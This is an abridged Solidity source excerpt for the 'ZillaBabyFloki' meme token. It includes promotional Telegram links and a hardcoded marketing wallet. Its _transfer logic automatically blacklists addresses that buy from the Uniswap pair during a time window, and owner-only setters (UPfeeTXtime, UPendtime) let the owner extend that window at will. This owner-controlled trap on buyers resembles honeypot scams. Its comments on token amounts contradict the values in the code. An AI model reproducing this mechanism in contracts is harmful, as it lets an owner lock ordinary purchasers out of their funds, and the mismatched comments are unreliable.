...
//Telegram:https://t.me/ZillababyflokiCN
//Telegram:https://t.me/Zillababyflokichina
...
contract ZillaBabyFloki is Context, IERC20, Ownable {
    ...
    address payable private _marketingAddress = 0xB6732D092C667184d382575189aA468B536c5c7f;
    ...
    string private _name = "ZillaBabyFloki";
    string private _symbol = "ZillaBabyFloki";
    ...
    // Max Tx amount to be 100 trillion
    uint256 public _maxTxAmount = 1000000000 * 10**6 * 10**9;

    // Liquify when 500 billion tokens are stored
    uint256 private numTokensSellToAddToLiquidity = 1250000 * 10**6 * 10**9;
    ...
    function UPfeeTXtime(uint256 _feeTXtime) public {
        require(msg.sender == owner());
        feeTXtime = _feeTXtime;
    }

    function UPendtime(uint256 _endtime) public {
        require(msg.sender == owner());
        endtime = _endtime;
    }
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair && to != owner() && !isaddLiquidity) {
            if (endtime == 0) {
                endtime = block.timestamp + feeTXtime;
            }
            if (endtime > block.timestamp) {
                isbotBlackList[to] = true;
            } else {
                isaddLiquidity = true;
            }
        }
